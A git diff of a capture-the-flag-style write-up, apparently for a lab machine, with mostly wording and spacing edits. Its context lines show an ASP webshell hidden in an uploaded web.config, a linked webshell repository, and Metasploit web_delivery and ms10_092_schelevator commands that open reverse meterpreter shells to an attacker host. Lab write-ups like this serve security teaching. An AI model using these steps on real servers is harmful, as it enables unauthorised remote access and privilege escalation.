@@ -59,7 +59,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 ### 2. Getting User
 
-We have only one port opening and which is port 80 HTTP.
+We have only one port opening 80 (HTTP).
 ![placeholder](https://inar1.github.io/public/images/2019-09-19/2019-09-18-12-05-36.png)
 
 We have only 2 path available. "transfer.aspx" and "Uploadedfiles".<br>
@@ -72,7 +72,7 @@ Besides, we can find a <a href="https://soroush.secproject.com/blog/2014/07/uplo
 <br>
 To obtain that purpose, at first, create web.config.<br>
 This time, web.config which has ASP webshell is being used.<br>
-Kali Linux has an ASP web shell installed by default.
+We can find an ASP webshell <a href="https://github.com/tennc/webshell/blob/master/asp/webshell.asp">here</a>
 {% highlight shell %}
 root@kali:~# cat web.config 
 <?xml version="1.0" encoding="UTF-8"?>
@@ -104,8 +104,6 @@ Function getCommandOutput(theCommand)
     getCommandOutput = objCmdExec.StdOut.ReadAll
 end Function
 %>
-
-
 <HTML>
 <BODY>
 <FORM action="" method="GET">
@@ -142,18 +140,22 @@ Then, run the metasploit module "web_delivery".<br>
 It launches a meterpreter shell handler and generates a command to be ran on the target server.
 {% highlight shell %}
 msf5 > use exploit/multi/script/web_delivery 
+
 msf5 exploit(multi/script/web_delivery) > set target 2
 target => 2
+
 msf5 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
 payload => windows/x64/meterpreter/reverse_tcp
+
 msf5 exploit(multi/script/web_delivery) > set lhost 10.10.14.30
 lhost => 10.10.14.30
+
 msf5 exploit(multi/script/web_delivery) > set srvhost 10.10.14.30
 srvhost => 10.10.14.30
+
 msf5 exploit(multi/script/web_delivery) > run
 [*] Exploit running as background job 0.
 [*] Exploit completed, but no session was created.
-
 [*] Started reverse TCP handler on 10.10.14.30:4444 
 [*] Using URL: http://10.10.14.30:8080/HqXxAAziFAQHS3
 [*] Server started.
@@ -229,12 +231,16 @@ Try the first one "ms10_092_schelevator".
 msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_092_schelevator
 
 msf5 exploit(windows/local/ms10_092_schelevator) > set payload windows/x64/meterpreter/reverse_tcppayload => windows/x64/meterpreter/reverse_tcp
+
 msf5 exploit(windows/local/ms10_092_schelevator) > set lhost 10.10.14.30
 lhost => 10.10.14.30
+
 msf5 exploit(windows/local/ms10_092_schelevator) > set lport 8888
 lport => 8888
+
 msf5 exploit(windows/local/ms10_092_schelevator) > set session 1
 session => 1
+
 msf5 exploit(windows/local/ms10_092_schelevator) > run
 
 [*] Started reverse TCP handler on 10.10.14.30:8888
